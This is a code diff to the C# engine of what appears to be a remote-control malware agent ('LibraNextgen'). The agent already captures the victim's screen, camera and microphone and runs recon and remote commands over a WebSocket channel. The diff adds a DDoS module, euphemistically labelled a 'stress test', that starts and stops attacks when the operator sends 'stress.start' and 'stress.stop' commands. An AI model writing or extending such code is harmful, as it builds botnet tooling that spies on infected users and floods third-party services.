@@ -3,6 +3,7 @@ using LibraNextgen.Agent.Communication;
 using LibraNextgen.Agent.Crypto;
 using LibraNextgen.Agent.Modules.Execution;
 using LibraNextgen.Agent.Modules.Recon;
+using LibraNextgen.Agent.Modules.StressTest;
 using LibraNextgen.Agent.Platform;
 using LibraNextgen.Common.Protocol;
 
@@ -22,6 +23,7 @@ public class AgentEngine
     private ScreenCapture? _screenCapture;
     private CameraCapture? _cameraCapture;
     private MicCapture? _micCapture;
+    private DDoSModule? _ddos;
 
     public AgentEngine(ConfigManager config, AgentCrypto crypto)
     {
@@ -112,6 +114,8 @@ public class AgentEngine
             HandleScreenUnbind();
             HandleCameraUnbind();
             HandleMicUnbind();
+            _ddos?.Dispose();
+            _ddos = null;
             _ws?.Dispose();
         }
     }
@@ -340,6 +344,14 @@ public class AgentEngine
             case "proxy.fetch":
                 await HandleProxyFetch(msg, ct);
                 break;
+
+            case "stress.start":
+                await HandleStressStart(msg, ct);
+                break;
+
+            case "stress.stop":
+                await HandleStressStop(msg, ct);
+                break;
         }
     }
 
@@ -464,7 +476,7 @@ public class AgentEngine
         if (_ws != null)
         {
             var escaped = drives.Select(d => $"\"{JsonEscape(d)}\"");
-            var dataJson = $"[{string.Join(",", escaped)}]";
+            var dataJson = $"{{\"drives\":[{string.Join(",", escaped)}]}}";
             await _ws.SendResultRawAsync("file.drives.result", _agentId, dataJson, msg.RequestId);
         }
     }
@@ -728,7 +740,7 @@ public class AgentEngine
                 case Common.Models.CommandType.FileDrives:
                     var drives = _executor.GetDrives();
                     var escaped = drives.Select(d => $"\"{JsonEscape(d)}\"");
-                    output = $"[{string.Join(",", escaped)}]";
+                    output = $"{{\"drives\":[{string.Join(",", escaped)}]}}";
                     success = true;
                     break;
                 case Common.Models.CommandType.Sleep:
@@ -887,5 +899,59 @@ public class AgentEngine
         _micCapture?.Stop();
         _micCapture?.Dispose();
         _micCapture = null;
+    }
+
+    // ── Stress Test (DDoS) ─────────────────────────────────────────────────
+
+    private async Task HandleStressStart(WebSocketMessage msg, CancellationToken ct)
+    {
+        if (_ws == null) return;
+
+        try
+        {
+            var data = msg.Data?.GetRawText();
+            if (data == null) return;
+
+            var config = System.Text.Json.JsonSerializer.Deserialize<StressConfig>(data);
+            if (config == null) return;
+
+            // Stop any existing attack
+            _ddos?.Dispose();
+
+            _ddos = new DDoSModule(_ws, _agentId, _hostname);
+            await _ddos.StartAsync(config, ct);
+
+            await _ws.SendResultRawAsync("stress.started", _agentId, "{\"ok\":true}");
+        }
+        catch (Exception ex)
+        {
+            try { await _ws.SendResultRawAsync("stress.started", _agentId,
+                System.Text.Json.JsonSerializer.Serialize(new { ok = false, error = ex.Message })); } catch { }
+        }
+    }
+
+    private async Task HandleStressStop(WebSocketMessage msg, CancellationToken ct)
+    {
+        if (_ddos == null) return;
+
+        try
+        {
+            await _ddos.StopAsync();
+            _ddos.Dispose();
+            _ddos = null;
+
+            if (_ws != null)
+                await _ws.SendResultRawAsync("stress.stopped", _agentId, "{\"ok\":true}");
+        }
+        catch (Exception ex)
+        {
+            try
+            {
+                if (_ws != null)
+                    await _ws.SendResultRawAsync("stress.stopped", _agentId,
+                        System.Text.Json.JsonSerializer.Serialize(new { ok = false, error = ex.Message }));
+            }
+            catch { }
+        }
     }
 }
